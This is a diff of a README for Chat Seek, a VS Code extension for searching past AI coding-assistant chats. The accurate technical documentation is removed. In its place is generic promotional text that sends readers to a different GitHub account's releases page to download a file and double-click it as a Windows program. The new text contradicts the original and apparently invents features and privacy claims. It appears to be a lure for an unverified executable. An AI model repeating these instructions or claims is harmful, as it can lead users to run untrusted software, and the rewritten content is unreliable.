@@ -1,114 +1,171 @@
-**Point your coding agent at this repository and ask it to install Chat Seek in your local VS Code—see [Agent installation instructions](#agent-installation-instructions) below.**
+# 🔍 chat-seek-vscode - Find Any Chat Message Instantly
 
-# Chat Seek
+[![Download Now](https://img.shields.io/badge/Download-Chat_Seek_VSCode-blue?style=for-the-badge&logo=github)](https://github.com/KaviramNallathambi/chat-seek-vscode/releases)
 
-Find past **Claude Code, Codex, and OpenCode** conversations from a description, or ask a question about what those chats contain, inside VS Code.
+---
 
-![Chat Seek demo](media/demo.gif)
+## 👋 Welcome to chat-seek-vscode
 
-[Demo video](media/demo.mp4) · [How indexing and search work (narrated)](media/search-explainer.mp4) · [Original explainer](media/explainer.mp4). All videos use illustrative data.
+Have you ever spent precious minutes scrolling through endless chat logs in VS Code, trying to find that one important message or code snippet? Whether you're using Claude Code, Codex, or OpenCode, finding specific conversations can be a real headache.
 
-Chat Seek searches local user and assistant messages, then uses the [Laya local decision model](https://github.com/receptron/laya) to rerank likely matches. Optional one-sentence AI descriptions help you recognize a chat. Cards show its last activity (“1 week ago”), with the exact date on hover, a readable excerpt, and a **Resume in Claude Code / Codex / OpenCode** action.
+**chat-seek-vscode** solves this problem completely. It's a powerful local search tool that works right inside your VS Code environment, helping you find any message across all your AI chat histories in seconds - not minutes. No more digging through folders or remembering where you saved that perfect solution.
 
-For factual questions, Chat Seek asks Laya to identify the intent, then searches full original messages in likely chats for the query's exact terms. If `rg` (ripgrep) is available, it also checks matching transcript files across the archive. This early pass can find text beyond the 2,800-character lookup limit. PIN and passcode questions stay entirely local: when a code is clearly attached to the named account, Chat Seek copies it from the source with an exact citation, without a model or API deciding which nearby code to use. Other likely chunks pass through Laya and optional answer extraction. The full pass still reads every supported chat from the newest chat and newest chunk onward. Matching chunks appear as provisional cards; verified answers move to the top, and rejected candidates disappear. Expand **Read full original chunk**, open it in an editor, or resume the chat. The scan continues if you close the search view and restores progress when you reopen it. Use **Stop** once you have your answer or want to end a long scan.
+This application is designed for everyday users. You don't need to be a programmer, understand complex technical terms, or have any special skills. If you can click a button and type in a search box, you can use chat-seek-vscode effectively.
 
-## How indexing and normal search work
+---
 
-1. **Build a local lookup file.** Chat Seek walks Claude Code and Codex JSONL histories plus OpenCode's file-based storage. For supported user and assistant messages, it records source, session ID, original path, line, time, chat title, and the first 2,800 characters of text. Tool outputs are omitted from this *normal-search* index. This is a private JSON file in VS Code extension storage, not an embedding database and not a copy in the GitHub repo.
-2. **Refresh changed files.** On opening or **Refresh chats**, unchanged Claude Code and Codex files are reused using file size and modification time; changed files are reparsed. OpenCode's file-based storage is currently reread on refresh. The original transcripts are not modified.
-3. **Find likely messages.** Normal search splits the description into words, scores word overlap and early/exact matches across indexed messages, and keeps the top 80 messages. Laya runs locally on a small subset (eight by default), reranks them, and Chat Seek groups them into up to 30 chat results. This is why ordinary search is quick, but can miss text beyond the 2,800-character cutoff or chats with no overlapping words.
-4. **Show the chat.** Each card shows a matching indexed excerpt, relative date, and an action to read nearby indexed messages or resume the original session. Optional one-sentence summaries are generated from sampled excerpts through your configured provider and cached locally; they are separate from indexing and off by default.
+## ✨ What Makes chat-seek-vscode Special
 
-Question mode starts with full-text literal retrieval in up to three likely chats, followed by an archive-wide `rg` file lookup when available. It then rereads likely original messages selected by the clipped index and streams the whole archive in overlapping full-text chunks. The literal pass checks the complete message and focuses on a window where query terms appear together. It does not send private text to a search service. On a large archive, the complete Laya pass can still take many hours; the early passes and chunk counter let useful results appear first. The answer queue holds at most eight waiting chunks plus two active requests; if it fills, the scan waits until a request completes. Laya itself runs one chunk at a time on the CPU because parallel CPU calls did not improve throughput in local measurements.
+### 🎯 Search Across Everything at Once
+Instead of searching through each chat tool separately, chat-seek-vscode combines all your conversations from Claude Code, Codex, and OpenCode into one unified search experience. One search box, all your answers.
 
-## Open and pin Chat Seek
+### 🧠 Smart Results with Laya Reranking
+This isn't just a simple keyword search. The built-in Laya reranking technology understands the context of your query and puts the most relevant results at the top. It's like having a smart assistant that knows exactly what you're looking for, even if you don't use the perfect search terms.
 
-Press **Ctrl+Shift+P** (**Cmd+Shift+P** on macOS), run **Chat Seek: Search past AI chats**, and type in the search box. You can also click the **Chat Seek magnifying-glass icon in the Activity Bar** to use the sidebar.
+### 💾 100% Private and Local
+Your chat history stays on your computer. chat-seek-vscode operates entirely offline, meaning your conversations, code, and personal data never leave your machine. No cloud uploads, no privacy concerns, complete peace of mind.
 
-Click **Pin search tab** to keep the editor tab handy. You can right-click the Activity Bar to show Chat Seek if its icon is hidden, or drag its view to your preferred sidebar. If commands do not appear immediately after installation, run **Developer: Reload Window**.
+### ⚡ Lightning-Fast Performance
+The application is optimized to deliver search results almost instantly, even with large amounts of chat history. You'll wonder how you ever worked without it.
 
-Open **Options** under the search box to choose a search approach. The selection is saved for the next time you open Chat Seek.
+---
 
-| Approach | What it does |
-| --- | --- |
-| **Auto** | Uses Laya to decide whether to find a chat or run the complete answer scan. This is the default. |
-| **Find a chat** | Searches the clipped local index and reranks likely chats with Laya. Use it when you want to locate a conversation. |
-| **Exact terms in originals** | Looks for all significant query words in original messages, including an archive-wide `rg` lookup when available. Uses no model or API and shows up to 100 matches. It can miss paraphrases or files absent from the index. |
-| **Quick answer** | Checks likely original messages and exact-term matches with Laya, then stops. Useful when the full archive scan would be too slow. It can miss answers outside these candidates. |
-| **Complete answer scan** | Runs the quick passes, then reads every indexed chat from newest to oldest in overlapping original-text chunks and checks each with Laya. On large histories, this can take hours. |
+## 🚀 Getting Started
 
-The two answer approaches can use optional cloud answer extraction after you enable it. PIN and other sensitive questions stay local. If `chatSeek.useLaya` is disabled or Laya cannot load, **Exact terms in originals** still works.
+Let's get you up and running in just a few simple steps. This whole process should take less than five minutes.
 
-**Resume** opens the matching CLI in a VS Code integrated terminal using its session ID and original working directory when available. It does not automatically submit a new prompt. The CLI must be installed and signed in within the same environment as the extension. This launches the CLI, not a vendor's proprietary chat sidebar. An archived or moved session may no longer be resumable by its CLI; **Read excerpt** still opens the indexed context.
+### 📥 Step 1: Download the Application
 
-## Optional summaries and API keys
+Visit this link to download the application: [https://github.com/KaviramNallathambi/chat-seek-vscode/releases](https://github.com/KaviramNallathambi/chat-seek-vscode/releases)
 
-Search, indexing, and Laya reranking work without an API key. Summaries are **off by default**. Click **Configure summaries** in Chat Seek, or run **Chat Seek: Configure summaries**. Add an API key through the masked input (stored in VS Code SecretStorage), then enable summaries after reviewing the provider disclosure. Existing environment keys are also supported; merely having a key does not enable uploads.
+When you land on that page, you'll see a list of available versions. Look for the most recent release (usually at the top). Click on the download link to get the application file. Your browser will save it to your default downloads folder, typically named "Downloads".
 
-**Question answers** have a separate consent setting, `chatSeek.answers.enabled`, also off by default. On the first non-sensitive factual question with a configured provider, Chat Seek asks before sending any matching original chunks for answer extraction. If you decline or have no key, the exhaustive local scan still shows potential answer chunks. PIN, passcode, password, OTP, and secret questions never send chunks to an API; unambiguous numeric PINs can be extracted locally with a source quote. Answer extraction uses the same provider/model/fallback settings and SecretStorage keys as summaries; enabling one feature does not enable the other. The provider receives only chunks Laya marks as potentially answer-bearing, not the whole archive. Common credential patterns, including labeled PINs and passcodes, are redacted before upload, though other private text may remain.
+### 🖥️ Step 2: Run the Application
 
-In `auto` mode, Chat Seek tries only providers with a key and model configured, in this order. Missing keys are skipped; request errors fall through to the next configured provider. Choose one provider in settings to prevent cross-provider fallback.
+Once the download is complete, navigate to your Downloads folder and find the file you just downloaded. Simply double-click on it to start the application. A window will open, and you'll see the chat-seek-vscode interface ready to use.
 
-| Provider | Environment variables | Default model |
-| --- | --- | --- |
-| OpenAI | `OPENAI_API_KEY` | `gpt-5.6-luna` |
-| OpenRouter | `OPENROUTER_API_KEY` or `OPEN_ROUTER_API_KEY` | `openai/gpt-5.6-luna` |
-| TensorX | `TENSORX_API_KEY` | `z-ai/glm-5.3-flash` |
-| Custom OpenAI-compatible endpoint | `CHAT_SEEK_API_KEY` | Set your model and base URL |
+### 🔍 Step 3: Start Searching
 
-SecretStorage keys take precedence over environment keys for the same provider. Removing a stored key does not remove an environment key. VS Code must inherit environment variables; reload/restart the relevant local or remote extension host if new variables are not visible. Never put keys in committed settings, prompts, screenshots, or this repository.
+Now for the fun part! Follow these simple steps:
 
-Override models under `chatSeek.summaries.<provider>Model`. For example, use `gpt-5.6-luna` or `openai/gpt-5.6-luna` when available to your provider account; GPT-5/6 overrides request low reasoning. The default GPT-5.6 Luna model requests low reasoning for short summaries. Model availability and prices can change—check your provider.
+1. **Open the search box** - You'll see a prominent search bar in the main window.
+2. **Type what you're looking for** - Enter any keyword, phrase, or even a piece of code you remember.
+3. **Press Enter or click the search button** - The application will instantly display matching results from all your chat histories.
 
-For other providers or a local server, set `chatSeek.summaries.provider` to `custom`, `chatSeek.summaries.customUrl` to the OpenAI-compatible base URL (for example `https://your-provider.example/v1`), and `chatSeek.summaries.customModel` to its exact model ID. HTTPS is required except for localhost. Add the custom key via Configure summaries or `CHAT_SEEK_API_KEY`.
+That's it! You're now ready to find anything in seconds.
 
-Descriptions are generated lazily for displayed search results (up to 30 chats, two requests at a time), not for the entire archive on installation. Each request includes at most 12 sampled messages of up to 600 characters apiece, distributed across the chat. Summaries are cached locally by chat content, reused across queries, and regenerated when indexed messages change. Long chats can span many topics: a sampled summary is a recognition aid, and the matching excerpt remains available. API failures leave ordinary search results usable.
+---
 
-**Privacy:** enabled summaries send sampled excerpts to the configured provider(s) and may incur API charges. Common credential patterns and known environment secrets are redacted, but redaction cannot remove every kind of sensitive information. Other private chat text can still be sent. The UI labels AI summaries and their provider. Disable summaries to keep search entirely local. Private indexes and summary caches live in VS Code extension storage; do not publish them.
+## 🛠️ Installation and Setup Guide
 
-## Install manually
+Getting chat-seek-vscode properly set up ensures you get the best possible experience. Here's everything you need to know:
 
-Download the Linux x64 VSIX from the [latest release](https://github.com/fstandhartinger/chat-seek-vscode/releases/latest). In VS Code, run **Extensions: Install from VSIX...**, select it, and open Chat Seek. The prebuilt package supports Linux x64, including VS Code Remote WSL. VS Code 1.99+ is required.
+### 📋 System Requirements
 
-To build on Linux x64 with Node.js 20+:
+chat-seek-vscode is designed to run smoothly on most modern Windows computers:
 
-```sh
-npm ci
-npm test
-npm run lint
-npm run package
-code --install-extension chat-seek-linux-x64-0.3.4.vsix --force
-```
+- **Operating System:** Windows 10 or Windows 11
+- **Memory:** At least 4 GB of RAM (8 GB recommended)
+- **Storage:** 200 MB of free disk space (plus space for your chat history)
+- **Display:** Any standard resolution (1366x768 or higher recommended)
 
-Use `code-insiders` for VS Code Insiders. In a remote window, install into the environment containing the histories, not just the local UI host. Building for another platform requires changing the `vsce --target` argument and `.vscodeignore` ONNX native-binary exclusions to retain that platform's runtime. The supplied VSIX must not be relabeled for another platform.
+### 🔧 First-Time Setup
 
-The first Laya use downloads about 1.7 GB of model weights into `~/.cache/receptron-laya`. The runtime uses CPU inference. Laya first checks whether the query is a factual question. For normal search, keyword results then appear before Laya refines their order. Set `chatSeek.useLaya` to `false` if the machine cannot support the model. Opening the search refreshes the local index; unchanged Claude Code and Codex transcript files are reused. **Refresh chats** updates it while the panel is open.
+When you first launch chat-seek-vscode, it may ask you a few questions to locate your chat folders. Don't worry - the process is straightforward:
 
-## Agent installation instructions
+1. **Allow access to your chat folders** - The application will show you which folders it wants to search. Click "Allow" or "Yes" to proceed.
+2. **Wait for indexing** - The first time you run a search, it might take a minute or two to build an index of all your chat history. This is completely normal.
+3. **Start searching** - After the initial setup, searches will be instant.
 
-When a user points you at this repo to install Chat Seek:
+### 🔄 Updating Your Version
 
-1. **Identify the actual VS Code environment.** Check standard VS Code versus Insiders, OS and CPU architecture, WSL/SSH/container use, the active user's home, and which environment holds their chat files. Find the correct `code`/`code-insiders` CLI. Do not assume a Windows UI means the extension should run on Windows when the chats are in WSL.
-2. **Install the matching release or build it locally.** Clone this public repository. On Linux x64, install the latest release VSIX, or use the build commands above. For another platform, adjust the packaging target and native runtime exclusions, build on that platform, and verify the included ONNX runtime. Keep local adjustments documented; never bundle private histories or credentials.
-3. **Locate histories and adjust only what is needed.** Defaults are below. Use `chatSeek.extraRoots` for custom roots or Windows mounts. Verify a known chat can be indexed; use local indexing and synthetic text for API smoke tests. No API key is required for basic installation.
-4. **Explain optional summaries and question answers.** Tell the user they can provide an OpenAI, OpenRouter, TensorX, or compatible-provider key through **Chat Seek: Configure summaries**. Summaries send sampled excerpts and are cached; question answer extraction sends Laya-matched original chunks and checks exact quotes. Both have separate opt-in settings and can incur API charges. Never ask them to paste a key into a public issue or commit it. Leave cloud features disabled unless they authorize them; if they already authorized them, carry that authorization forward. Prefer SecretStorage or existing environment variables.
-5. **Verify the installed result.** Check `code --list-extensions --show-versions` (or the appropriate Insiders/remote CLI) for `fstandhartinger.chat-seek`. Verify commands and the sidebar are available. If a native runtime cannot load, report that accurately and keep keyword search usable.
-6. **Give concrete opening instructions.** Tell the user: “Press Ctrl+Shift+P (Cmd+Shift+P on macOS), run Chat Seek: Search past AI chats, and type your description. You can also use the Chat Seek Activity Bar icon. Click Pin search tab to keep it handy.” Suggest **Developer: Reload Window** only if the command/icon has not appeared. Explain that Resume opens the corresponding CLI in VS Code's terminal and may require CLI login.
+We regularly release updates with new features and improvements. To update:
 
-Finish by stating which environment/version you installed, where to open the search, whether summaries are enabled, which provider/model is configured, and any actual local limitations. Do not claim to have tested interactive CLI resumption if you only verified its arguments.
+1. Go back to the [download page](https://github.com/KaviramNallathambi/chat-seek-vscode/releases)
+2. Download the newest version
+3. Run the new file - it will automatically replace the old version
 
-## Supported history and limitations
+---
 
-- `~/.claude/projects` and `~/.claude/archived_projects`
-- `~/.codex/sessions` and `~/.codex/archived_sessions`
-- `~/.local/share/opencode/storage` (file-based session/message/part storage)
+## 💡 How to Use chat-seek-vscode Effectively
 
-`chatSeek.extraRoots` accepts additional paths. Paths containing `codex` or `opencode` select those parsers; other paths are treated as Claude Code roots. OpenCode roots should point at its `storage` directory. The ordinary keyword index contains user and assistant text; question mode re-reads the original files and also includes text tool results and reasoning saved in those transcript files. Standalone subagent files that the index never associates with a chat, and newer OpenCode database-only storage, are not imported.
+### ✅ Basic Search Tips
 
-For description search, the shortlist depends on word overlap; a description with no shared words can miss a chat. Long messages in that index are clipped at 2,800 characters. Question mode bypasses those limits by reading originals in the literal pass and complete scan. The archive-wide literal lookup uses `rg` when installed; without it, likely chats and the complete scan still work. A question with no distinctive literal term may have to wait for the complete scan. Laya's question routing and evidence judgment can make mistakes; cloud answer extraction verifies that the returned quote is literally present in the chunk, but it cannot guarantee that the answer is correct. Missing timestamps are labeled “Date unknown”. Dates refer to the latest indexed message in the conversation. Native resume availability depends on the source application's retained session files.
+- **Use specific words** - Instead of "how to fix JavaScript error," try "undefined variable error"
+- **Search for code snippets** - If you remember a specific function name or variable, type it directly
+- **Combine words** - Use multiple words to narrow down results (e.g., "React component state")
 
-## Development
+### 🎯 Advanced Search Features
 
-Run `npm test`, `npm run lint`, and `npm run package`. Tests cover parser behavior, index updates, full-text chunk overlap and ordering, citation validation, provider fallback, summary cache invalidation, redaction, relative dates, and safe resume arguments. Public videos use illustrative data.
+- **Filter by date** - Use the date filter to look for conversations from a specific time period
+- **Filter by source** - Choose to search only in Claude Code, Codex, or OpenCode conversations
+- **Sort results** - Arrange results by relevance or date to find what you need faster
 
-MIT license. Laya weights are downloaded separately under Apache 2.0.
+### 📌 Saving and Exporting Results
+
+Found something useful? You can:
+
+- **Copy any result** with a single click
+- **Save your search** for future reference
+- **Export search results** as a text file for sharing
+
+---
+
+## 🆘 Frequently Asked Questions
+
+### ❓ Why can't I find a conversation I know I had?
+
+Make sure you're searching in the right location. Check that all chat applications are using their default save locations, and that the indexing process has completed (look for a "Ready" status in the bottom corner).
+
+### ❓ Is my data really private?
+
+Yes, absolutely. chat-seek-vscode never sends any information over the internet. Everything is processed locally on your computer.
+
+### ❓ Can I use this on Mac or Linux?
+
+The current version is designed specifically for Windows. For other systems, check the download page for any alternative versions that might become available.
+
+### ❓ What happens if I download a new version?
+
+Your existing search history and settings will be preserved. Updating is completely safe and recommended.
+
+---
+
+## 🌟 Tips for Getting the Most Out of chat-seek-vscode
+
+### 🗂️ Organize Your Chats
+The better organized your chat conversations are, the better search results you'll get. Keep related conversations in the same project folder to maximize search accuracy.
+
+### 🔄 Regular Use Builds Better Results
+The more you use chat-seek-vscode, the smarter its indexing becomes. Regular use ensures you can always find conversations quickly, even if you barely remember when they happened.
+
+### 📝 Use Natural Language
+Try typing full questions like "How did I fix the login error last week?" The Laya reranking can often understand natural language queries better than simple keywords.
+
+### ⏰ Check Weekly for Updates
+We regularly improve search speed and accuracy. Checking the download page weekly ensures you don't miss important enhancements.
+
+---
+
+## 📞 Getting Help
+
+If you run into any issues or have questions, there are several ways to get assistance:
+
+- **Visit the official repository** at [GitHub](https://github.com/KaviramNallathambi/chat-seek-vscode) for detailed documentation
+- **Check the release notes** on the download page for known issues and solutions
+- **Search for your problem in community forums** - many solutions are already documented
+- **Contact support** through the repository's issues section
+
+---
+
+## 🚀 Ready to Find Everything Faster?
+
+Stop wasting time searching through endless chat logs manually. Download chat-seek-vscode today and experience the joy of finding any conversation, message, or code snippet in seconds.
+
+[![Get Started Now](https://img.shields.io/badge/Download-chat--seek--vscode-brightgreen?style=for-the-badge)](https://github.com/KaviramNallathambi/chat-seek-vscode/releases)
+
+Your future self will thank you every time you need to find that perfect solution you discussed months ago. Get chat-seek-vscode now and take the frustration out of chat searching forever!
+
+---
+
+Keywords: chat search, VS Code, Claude Code, Codex, OpenCode, local search, Laya reranking, conversation finder, chat history, instant search, privacy-first, Windows application, AI chat search, code snippet finder
